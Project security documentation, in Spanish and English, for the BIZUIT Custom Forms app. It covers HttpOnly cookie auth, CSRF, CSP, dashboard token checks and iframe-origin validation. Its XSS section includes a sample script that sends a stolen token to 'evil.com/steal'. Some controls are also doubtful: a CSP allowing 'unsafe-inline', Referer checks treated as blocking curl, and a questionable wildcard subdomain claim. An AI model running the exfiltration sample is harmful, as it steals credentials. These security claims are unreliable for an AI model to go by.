# BIZUIT Custom Forms - Security Implementation

## Overview

Este documento describe las medidas de seguridad implementadas en el proyecto para proteger contra ataques comunes web.

---

## 1. HttpOnly Cookies para Autenticación

### ✅ Implementación

**Reemplazamos localStorage por HttpOnly cookies** para almacenar tokens JWT.

#### Antes (INSEGURO):
```typescript
// ❌ Vulnerable a XSS
localStorage.setItem('admin_token', token)
const token = localStorage.getItem('admin_token') // Cualquier script puede leerlo
```

#### Ahora (SEGURO):
```typescript
// ✅ Protegido contra XSS
cookies().set('auth_token', token, {
  httpOnly: true,    // JavaScript NO puede leerlo
  secure: true,      // Solo HTTPS en producción
  sameSite: 'lax',   // Protección CSRF
  maxAge: 86400,     // 24 horas
})
```

### 📁 Archivos Involucrados

- **[app/api/auth/login/route.ts](app/api/auth/login/route.ts)** - Login endpoint que establece cookies
- **[app/api/auth/logout/route.ts](app/api/auth/logout/route.ts)** - Logout endpoint que limpia cookies
- **[app/api/auth/session/route.ts](app/api/auth/session/route.ts)** - Verifica sesión activa
- **[hooks/useLoginForm.ts](hooks/useLoginForm.ts)** - Hook de login actualizado
- **[app/admin/layout.tsx](app/admin/layout.tsx)** - Layout con verificación de sesión

### 🛡️ Protecciones

| Protección | Descripción |
|------------|-------------|
| **HttpOnly** | Cookies inaccesibles por JavaScript (previene XSS) |
| **Secure** | Solo se envían por HTTPS en producción |
| **SameSite=lax** | Previene CSRF attacks |
| **MaxAge** | Expiración automática de sesión |
| **Path=/** | Cookies solo válidas en la app |

---

## 2. XSS Protection (Cross-Site Scripting)

### ¿Qué es XSS?

Un atacante inyecta código JavaScript malicioso en tu app:

```html
<!-- Ejemplo de ataque XSS -->
<script>
  fetch('https://evil.com/steal', {
    body: localStorage.getItem('admin_token') // ❌ ANTES: Token robado
  })
</script>
```

### ✅ Cómo lo prevenimos

1. **HttpOnly Cookies** - JavaScript no puede acceder al token
2. **Next.js Auto-Escaping** - Sanitiza automáticamente el output HTML
3. **CSP Headers** (recomendado para producción) - Ver sección CSP

### Ejemplo de Intento de Ataque

```javascript
// Atacante intenta robar token:
console.log(document.cookie) // ✅ NO incluye auth_token (HttpOnly)
console.log(localStorage.getItem('admin_token')) // ✅ null (ya no se usa)
```

---

## 3. CSRF Protection (Cross-Site Request Forgery)

### ¿Qué es CSRF?

Un sitio malicioso intenta hacer requests a tu app usando tu sesión:

```html
<!-- evil-site.com -->
<img src="https://your-app.com/api/admin/delete-all" />
<!-- Si usas cookies normales, se envían automáticamente -->
```

### ✅ Cómo lo prevenimos

1. **SameSite=lax cookies** - Solo se envían desde tu propio dominio
2. **Credentials: 'include'** - Requests explícitos requieren este flag
3. **Origin validation** - Next.js valida el origen de las requests

```typescript
// Client-side - debe incluir credentials explícitamente
fetch('/api/auth/login', {
  credentials: 'include' // ✅ Requerido para enviar cookies
})
```

---

## 4. Comparación: localStorage vs HttpOnly Cookies

### localStorage (Método Anterior)

```typescript
// ❌ INSEGURO
const login = async (username, password) => {
  const res = await fetch('http://backend:8000/api/auth/login', {
    body: JSON.stringify({ username, password })
  })
  const { token } = await res.json()

  localStorage.setItem('admin_token', token) // ❌ Vulnerable a XSS

  // En cada request:
  const authToken = localStorage.getItem('admin_token')
  fetch('/api/data', {
    headers: { Authorization: `Bearer ${authToken}` }
  })
}
```

**Problemas:**
- ✗ Cualquier script puede leer `localStorage`
- ✗ Vulnerable a XSS attacks
- ✗ No hay protección CSRF
- ✗ Token visible en DevTools

### HttpOnly Cookies (Implementación Actual)

```typescript
// ✅ SEGURO
const login = async (username, password) => {
  const res = await fetch('/api/auth/login', { // ← Next.js API route
    body: JSON.stringify({ username, password }),
    credentials: 'include' // ← Incluir cookies
  })

  // Server establece cookie HttpOnly - NO guardamos nada en cliente

  // En cada request:
  fetch('/api/data', {
    credentials: 'include' // ← Cookie se envía automáticamente
  })
}
```

**Ventajas:**
- ✓ JavaScript NO puede leer la cookie
- ✓ Protección XSS automática
- ✓ Protección CSRF con SameSite
- ✓ Token invisible en DevTools

---

## 5. Flujo de Autenticación Seguro

```mermaid
sequenceDiagram
    participant User
    participant Browser
    participant NextJS
    participant FastAPI

    User->>Browser: 1. Ingresa credentials
    Browser->>NextJS: 2. POST /api/auth/login
    NextJS->>FastAPI: 3. POST /api/auth/login
    FastAPI-->>NextJS: 4. { token, user }
    NextJS->>Browser: 5. Set HttpOnly Cookie
    Note over NextJS,Browser: Cookie: auth_token=xyz<br/>HttpOnly, Secure, SameSite
    Browser->>User: 6. Redirect /admin

    Note over User,FastAPI: Subsequent Requests

    Browser->>NextJS: 7. GET /api/admin/data
    Note over Browser: Cookie sent automatically
    NextJS->>NextJS: 8. Validate cookie
    NextJS-->>Browser: 9. Protected data
```

---

## 6. Content Security Policy (CSP)

### Recomendado para Producción

Agrega estos headers en producción para prevenir XSS:

```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'unsafe-eval' 'unsafe-inline';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      font-src 'self' data:;
      connect-src 'self' ${process.env.NEXT_PUBLIC_API_URL};
    `.replace(/\s{2,}/g, ' ').trim()
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'Referrer-Policy',
    value: 'origin-when-cross-origin'
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  }
]

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ]
  },
}
```

---

## 7. Best Practices Implementadas

### ✅ Checklist de Seguridad

- [x] **HttpOnly cookies** para tokens de autenticación
- [x] **Secure flag** en cookies (producción)
- [x] **SameSite=lax** para prevenir CSRF
- [x] **Expiración de sesión** (24 horas)
- [x] **Logout endpoint** que limpia cookies
- [x] **Session validation** en cada request protegido
- [x] **Environment variables** para URLs sensibles
- [x] **No exponer tokens** en localStorage/sessionStorage
- [ ] **CSP headers** (recomendado para producción)
- [ ] **Rate limiting** (recomendado para producción)
- [ ] **HTTPS only** (requerido en producción)

---

## 8. Configuración de Producción

### Variables de Entorno Requeridas

```bash
# .env.production
FASTAPI_URL=https://api.bizuit.com
NODE_ENV=production # ← Habilita Secure cookies
```

### Verificación de Cookies en Producción

En producción, las cookies deben tener:

```
Set-Cookie: auth_token=xyz; HttpOnly; Secure; SameSite=Lax; Max-Age=86400; Path=/
```

Verificar con DevTools → Network → Response Headers

---

## 9. Testing de Seguridad

### Tests Implementados

- ✓ Login con cookies - [hooks/__tests__/useLoginForm.test.ts](hooks/__tests__/useLoginForm.test.ts)
- ✓ No usage de localStorage para tokens
- ✓ Credentials: 'include' en requests

### Tests Recomendados (Futuro)

```bash
# Penetration testing tools
npm install --save-dev @security-audit/scanner

# Run security audit
npm audit
npm run security:scan
```

---

## 10. Monitoreo y Logs

### Logs de Seguridad

Los siguientes eventos se logean:

```typescript
// Login attempts
console.log('[Auth API] Login attempt:', { username, success })

// Failed authentications
console.error('[Auth API] Login failed:', { username, error })

// Session checks
console.log('[Auth API] Session check:', { authenticated, userId })
```

### Métricas a Monitorear en Producción

- Failed login attempts (brute force detection)
- Session hijacking attempts
- Invalid token usage
- CSRF token mismatches

---

## 11. Incident Response

### En caso de brecha de seguridad:

1. **Invalidar todas las sesiones activas**
   ```bash
   # Cambiar secret de JWT en backend
   # Forzar re-login de todos los usuarios
   ```

2. **Rotar secrets**
   ```bash
   # Generar nuevo JWT secret
   openssl rand -hex 32
   ```

3. **Auditar logs**
   ```bash
   # Buscar patrones sospechosos
   grep "Login failed" logs/*.log
   ```

4. **Notificar usuarios afectados**

---

## 12. Form Access Control (Dashboard Token Validation)

### 🔒 Critical Security: Two Operating Modes

El runtime app tiene **DOS MODOS** de operación controlados por `NEXT_PUBLIC_ALLOW_DEV_MODE`:

#### 🛡️ Production Mode (Secure by Default)

**Configuration:**
```bash
# .env.local (production)
NEXT_PUBLIC_ALLOW_DEV_MODE=false

# OR leave undefined → secure by default
```

**Behavior:**
- ✅ Forms **MUST** be accessed through Bizuit Dashboard with token `s`
- ✅ Direct URL access is **BLOCKED**
- ✅ Token validation is **REQUIRED**

**Example:**
```
✅ ALLOWED (with token):
https://test.bizuit.com/arielschBIZUITCustomForms/form/aprobacion-gastos?s=aAAV/9xqhAE=&InstanceId=123

❌ BLOCKED (direct access):
https://test.bizuit.com/arielschBIZUITCustomForms/form/aprobacion-gastos
→ Error: "🚫 Access Denied: This form must be accessed through Bizuit Dashboard"
```

#### 🧪 Development Mode (Local Testing Only)

**Configuration:**
```bash
# .env.local (development)
NEXT_PUBLIC_ALLOW_DEV_MODE=true
```

**Behavior:**
- ⚠️ Forms can be accessed **WITHOUT** Dashboard token
- ⚠️ Direct URL access is **ALLOWED**
- ℹ️ Console warning: "DEVELOPMENT MODE: Direct access allowed"

**⚠️ CRITICAL WARNING:**
```
NEVER deploy to production with NEXT_PUBLIC_ALLOW_DEV_MODE=true
This creates a CRITICAL SECURITY VULNERABILITY
Anyone can access forms without authorization
```

### 🎯 Security Decision Logic

```typescript
// app/form/[formName]/page.tsx
const fromDashboard = isFromDashboard()  // Check if 's' parameter exists
const allowDevMode = process.env.NEXT_PUBLIC_ALLOW_DEV_MODE === 'true'

// 🔒 PRODUCTION SECURITY: Require Dashboard token
if (!fromDashboard && !allowDevMode) {
  throw new Error('🚫 Access Denied: This form must be accessed through Bizuit Dashboard')
}

// Validate Dashboard token if present
if (fromDashboard) {
  const validation = await getDashboardParameters()

  if (!validation.valid) {
    throw new Error(`Dashboard token validation failed: ${validation.error}`)
  }

  // ✅ Token validated, proceed with secured parameters
  setDashboardParams(validation.parameters)
}
```

### 🔐 Token Validation Flow

#### 1. URL Parameters (from Dashboard)

```
?s=aAAV/9xqhAE=              ← Encrypted TokenId (TripleDES)
&InstanceId=12345            ← Process instance ID
&UserName=admin              ← User executing the form
&eventName=MyProcess         ← Process name
&activityName=Task1          ← Activity name
&token=Basic123              ← Auth token (optional)
```

#### 2. Frontend Validation

```typescript
// lib/dashboard-params.ts
export async function getDashboardParameters() {
  // Extract 's' parameter
  const queryParams = extractDashboardParams()

  if (!queryParams || !queryParams.s) {
    return { valid: false, error: 'Missing encrypted token' }
  }

  // Send to backend for validation
  const response = await fetch('/api/dashboard/validate-token', {
    method: 'POST',
    body: JSON.stringify({
      encryptedToken: queryParams.s,
      instanceId: queryParams.InstanceId,
      userName: queryParams.UserName,
      // ...
    })
  })

  return await response.json()
}
```

#### 3. Backend Validation (FastAPI)

```python
# backend/api/dashboard.py
@app.post("/api/dashboard/validate-token")
async def validate_token(request: TokenValidationRequest):
    # 1. Decrypt token 's' using TripleDES
    decrypted_token_id = decrypt_triple_des(request.encryptedToken)

    # 2. Query SecurityTokens table
    token = db.query(SecurityTokens).filter_by(
        token_id=decrypted_token_id
    ).first()

    # 3. Validate expiration
    if not token or token.expiration_date < datetime.now():
        return {"valid": False, "error": "Invalid or expired token"}

    # 4. Validate operation (1=edit, 2=view)
    # 5. Validate IP (optional)
    # 6. Mark as used (one-time token)

    # 7. Return validated parameters
    return {
        "valid": True,
        "parameters": {
            "instanceId": request.instanceId,
            "operation": token.operation,
            "tokenId": token.token_id,
            # ...
        }
    }
```

### 📋 Production Deployment Checklist

**CRITICAL - Must Verify Before Production:**

- [ ] **Set `NEXT_PUBLIC_ALLOW_DEV_MODE=false`** in production `.env.local`
- [ ] **OR** remove the variable entirely (secure by default)
- [ ] Verify Azure pipeline sets `NEXT_PUBLIC_ALLOW_DEV_MODE=false`
- [ ] Test that direct URL access is **BLOCKED**
- [ ] Test that Dashboard access with token `s` **WORKS**
- [ ] Verify console shows **NO** "DEVELOPMENT MODE" warnings
- [ ] Verify `SecurityTokens` table exists in database
- [ ] Test token expiration validation
- [ ] Test one-time token usage (cannot reuse)

### 🚨 Security Events to Monitor

```typescript
// Failed token validation
console.error('[Security] Token validation failed:', {
  error: validation.error,
  timestamp: new Date().toISOString()
})

// Direct access attempt in production
console.error('[Security] Unauthorized direct access attempt:', {
  formName: formName,
  allowDevMode: allowDevMode,
  fromDashboard: fromDashboard,
  timestamp: new Date().toISOString()
})

// Successful validation (info level)
console.log('[Security] Token validated successfully:', {
  instanceId: params.instanceId,
  userName: params.userName,
  operation: params.operation
})
```

### 🛡️ Best Practices

**✅ DO:**
- Always set `NEXT_PUBLIC_ALLOW_DEV_MODE=false` in production
- Always validate token on backend (never trust client)
- Always check token expiration
- Always use one-time tokens (mark as used after validation)
- Always log security events

**❌ DON'T:**
- NEVER deploy with `NEXT_PUBLIC_ALLOW_DEV_MODE=true` to production
- NEVER skip token validation
- NEVER trust URL parameters without backend validation
- NEVER expose backend validation errors in detail to client
- NEVER reuse tokens

---

## 13. Standalone Forms (Iframe-Only Access)

### 🔒 Two Form Loaders: `/form` vs `/formsa`

El runtime app implementa **DOS** loaders distintos para diferentes casos de uso:

| Loader | Ruta | Dashboard Token | Iframe Required | Use Case |
|--------|------|-----------------|-----------------|----------|
| **Standard** | `/form/[formName]` | Required (prod)<br/>Optional (dev) | No | Forms accessed from Bizuit Dashboard |
| **Standalone** | `/formsa/[formName]` | Optional | **YES** | Forms embedded in external apps |

### 🎯 Standalone Forms (`/formsa/*`)

**Purpose:** Allow embedding forms in external applications (e.g., partner portals, customer dashboards) with strict origin control.

**Security Model:**
- ✅ **MUST** be loaded inside an iframe (blocks direct browser access)
- ✅ **MUST** be from an allowed origin (configurable via env vars)
- ✅ Supports optional Dashboard token for additional context
- ✅ Triple-layer validation: client-side + middleware + CSP headers
- ⚠️ **NEVER** checks `NEXT_PUBLIC_ALLOW_DEV_MODE` (always accessible if iframe requirements met)

### 🛡️ Triple-Layer Security Architecture

#### Layer 1: Client-Side Validation (lib/iframe-origin-validator.ts)

```typescript
// 1. Validate iframe detection
if (!isInIframe()) {
  throw new Error('Standalone forms can only be loaded inside an iframe')
}

// 2. Get parent origin
const parentOrigin = getParentOrigin() // From document.referrer

// 3. Validate against allowed list
const allowed = allowedOrigins.some(pattern =>
  isOriginAllowed(parentOrigin, pattern)
)

if (!allowed) {
  throw new Error(`Origin "${parentOrigin}" is not in the allowed list`)
}
```

**Features:**
- Exact origin matching: `https://app.example.com`
- Wildcard subdomain matching: `https://*.example.com`
- Port-agnostic localhost: `http://localhost` (any port)
- Configurable via `NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS`

#### Layer 2: Server-Side Middleware (middleware.ts)

```typescript
// Validate Referer header for /formsa/* routes
if (request.nextUrl.pathname.startsWith('/formsa/')) {
  const referer = request.headers.get('referer')

  if (!referer) {
    return new NextResponse({ error: 'Missing Referer header' }, {
      status: 403
    })
  }

  const refererOrigin = new URL(referer).origin
  const isAllowed = allowedOrigins.some(p => isOriginAllowed(refererOrigin, p))

  if (!isAllowed) {
    return new NextResponse({
      error: `Origin "${refererOrigin}" not allowed`
    }, { status: 403 })
  }
}
```

**Blocks:**
- Requests without Referer header
- Requests from unauthorized origins
- Direct curl/Postman access (no referer)

#### Layer 3: CSP frame-ancestors Headers (next.config.js)

```typescript
// next.config.js
async headers() {
  return [
    {
      source: '/formsa/:path*',
      headers: [
        {
          key: 'Content-Security-Policy',
          value: `frame-ancestors ${allowedOrigins.join(' ')}`,
        },
        {
          key: 'X-Frame-Options',
          value: 'SAMEORIGIN',
        },
      ],
    },
  ]
}
```

**Enforces:**
- Browser-level iframe embedding restrictions
- Cannot be bypassed by malicious JavaScript
- Works even if client-side validation is bypassed

### 📋 Configuration

#### Environment Variables

```bash
# .env.local (development)
NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS=https://test.bizuit.com,https://localhost:3000
NEXT_PUBLIC_ALLOW_LOCALHOST_IFRAME=true

# .env.production
NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS=https://test.bizuit.com,https://app.bizuit.com,https://*.bizuit.com
NEXT_PUBLIC_ALLOW_LOCALHOST_IFRAME=false
```

**Origin Formats Supported:**

```bash
# Exact match
NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS=https://app.example.com

# Multiple origins (comma-separated)
NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS=https://app1.com,https://app2.com

# Wildcard subdomains
NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS=https://*.example.com

# Mixed (all above)
NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS=https://app.com,https://*.example.com,https://partner.io
```

#### Azure Pipelines Configuration

All deployment pipelines include the new variables:

```yaml
# azure-pipelines-build.yml
# azure-pipelines-deploy.yml
# azure-pipelines-deploy-recubiz.yml
# azure-pipelines-frontend-webapp.yml

NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS=https://test.bizuit.com,https://*.bizuit.com
NEXT_PUBLIC_ALLOW_LOCALHOST_IFRAME=false
```

### 🔐 Security Decision Logic

```typescript
// app/formsa/[formName]/page.tsx

// 1. ALWAYS validate iframe origin (no ALLOW_DEV_MODE check)
const iframeValidation = validateIframeOrigin()

if (!iframeValidation.isInIframe) {
  throw new Error('Standalone forms can only be loaded inside an iframe')
}

if (!iframeValidation.isAllowedOrigin) {
  throw new Error(`Origin not allowed: ${iframeValidation.error}`)
}

// 2. Optional: Try to get Dashboard parameters (not required)
try {
  const validation = await getDashboardParameters()
  if (validation.valid) {
    setDashboardParams(validation.parameters)
  }
} catch (err) {
  // Dashboard params are optional for standalone loader
  console.log('No Dashboard parameters provided (optional)')
}

// 3. Load form
const metadata = await fetch(`/api/custom-forms/${formName}/metadata`)
const component = await loadDynamicFormCached(formName, { version })
```

### 🚫 Attack Scenarios (Blocked)

#### Scenario 1: Direct Browser Access

```
❌ BLOCKED by client-side check:
https://test.bizuit.com/arielschBIZUITCustomForms/formsa/my-form

Error: "🚫 Access Denied: Standalone forms can only be loaded inside an iframe"
```

#### Scenario 2: Unauthorized Origin

```html
<!-- evil.com embeds iframe -->
<iframe src="https://test.bizuit.com/.../formsa/my-form"></iframe>

❌ BLOCKED by all 3 layers:
- Client: isOriginAllowed('https://evil.com', allowedOrigins) → false
- Middleware: Referer header validation fails → 403
- CSP: frame-ancestors header blocks embedding → Browser error
```

#### Scenario 3: cURL/Postman Attack

```bash
curl https://test.bizuit.com/.../formsa/my-form

❌ BLOCKED by middleware:
- No Referer header → 403 Forbidden
- Response: {"error":"Missing Referer header"}
```

#### Scenario 4: Subdomain Bypass Attempt

```
Allowed: https://*.bizuit.com
Attempt: https://evil.com.bizuit.com

❌ BLOCKED by origin matching logic:
- Wildcard *.bizuit.com matches *.bizuit.com only
- Does NOT match evil.com.bizuit.com
```

### ✅ Valid Usage Example

#### Partner Portal Embedding

```html
<!-- partner.example.com (allowed origin) -->
<!DOCTYPE html>
<html>
<head>
  <title>Partner Portal</title>
</head>
<body>
  <h1>Submit Approval Request</h1>

  <!-- Embed standalone form -->
  <iframe
    src="https://test.bizuit.com/arielschBIZUITCustomForms/formsa/aprobacion-gastos?version=1"
    width="100%"
    height="800px"
    style="border: none;"
  ></iframe>

  <script>
    // Optional: Listen for form submission events
    window.addEventListener('message', (event) => {
      if (event.data.type === 'FORM_SUBMITTED') {
        console.log('Form submitted:', event.data.payload)
        // Handle success (e.g., show confirmation, redirect)
      }
    })
  </script>
</body>
</html>
```

**Configuration Required:**

```bash
# Add partner.example.com to allowed origins
NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS=https://test.bizuit.com,https://partner.example.com
```

### 📋 Production Deployment Checklist

**CRITICAL - Must Verify Before Production:**

- [ ] **Set allowed origins** in production environment variables
- [ ] **Disable localhost** (`NEXT_PUBLIC_ALLOW_LOCALHOST_IFRAME=false`)
- [ ] Test iframe embedding from **allowed origins** works
- [ ] Test iframe embedding from **unauthorized origins** is blocked
- [ ] Test **direct browser access** is blocked
- [ ] Test **cURL/Postman access** is blocked (403 Forbidden)
- [ ] Verify CSP headers in browser DevTools (Network → Headers)
- [ ] Verify middleware logs show origin validation
- [ ] Test wildcard subdomain matching if used
- [ ] Monitor logs for unauthorized access attempts

### 🚨 Security Events to Monitor

```typescript
// Middleware logs (server-side)
console.log('[Middleware] ✅ Standalone form access allowed from:', refererOrigin)
console.warn('[Middleware] ❌ Standalone form access blocked - no Referer header')
console.warn('[Middleware] ❌ Standalone form access blocked - origin not allowed:', refererOrigin)

// Client logs (browser console)
console.log('[Standalone Form Page] ✅ Iframe validation passed - origin:', parentOrigin)
console.error('[Standalone Form Page] ❌ Error loading form:', error.message)
```

### 🛡️ Best Practices

**✅ DO:**
- Always configure `NEXT_PUBLIC_ALLOWED_IFRAME_ORIGINS` in production
- Use wildcard `https://*.example.com` for multi-subdomain scenarios
- Monitor logs for unauthorized access attempts
- Test iframe embedding from all expected origins before deployment
- Use HTTPS for all allowed origins (HTTP not recommended)
- Document all allowed origins in deployment notes

**❌ DON'T:**
- NEVER allow `http://` origins in production (except localhost in dev)
- NEVER use `*` wildcard for all origins (security risk)
- NEVER skip middleware or CSP configuration
- NEVER expose detailed error messages to end users
- NEVER trust client-side validation alone (use all 3 layers)

### 🔍 Comparison: `/form` vs `/formsa`

| Feature | `/form/[formName]` | `/formsa/[formName]` |
|---------|-------------------|---------------------|
| **Dashboard Token** | Required (prod), Optional (dev) | Optional (always) |
| **Iframe Required** | No | **YES** |
| **Origin Validation** | No | **YES** (triple-layer) |
| **ALLOW_DEV_MODE** | Checked | **NOT** checked |
| **Direct Browser** | Allowed (if dev mode) | **BLOCKED** (always) |
| **Use Case** | Dashboard-launched forms | External app embeds |
| **Middleware Check** | No | YES (Referer validation) |
| **CSP Headers** | Standard | `frame-ancestors` |

### 📁 Files Involved

- **[app/formsa/[formName]/page.tsx](app/formsa/[formName]/page.tsx)** - Standalone form loader
- **[lib/iframe-origin-validator.ts](lib/iframe-origin-validator.ts)** - Origin validation logic
- **[middleware.ts](middleware.ts)** - Server-side Referer validation
- **[next.config.js](next.config.js)** - CSP headers configuration
- **[.env.example](.env.example)** - Environment variable templates

---

## 14. Referencias

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Next.js Security](https://nextjs.org/docs/app/building-your-application/configuring/security)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

---

## Resumen

**Migración Completada:**
- ❌ localStorage (vulnerable) → ✅ HttpOnly Cookies (seguro)
- ❌ Client-side token storage → ✅ Server-side cookie management
- ❌ No CSRF protection → ✅ SameSite cookies
- ❌ Tokens expuestos → ✅ Tokens ocultos

**Impacto:**
- 🛡️ **XSS Protection:** Tokens inaccesibles por JavaScript
- 🛡️ **CSRF Protection:** SameSite cookies
- 🛡️ **Session Security:** Expiración automática
- 🛡️ **Production Ready:** Secure flag para HTTPS

---

*Última actualización: 2025-11-18*
*Versión: 2.0 (HttpOnly Cookies)*
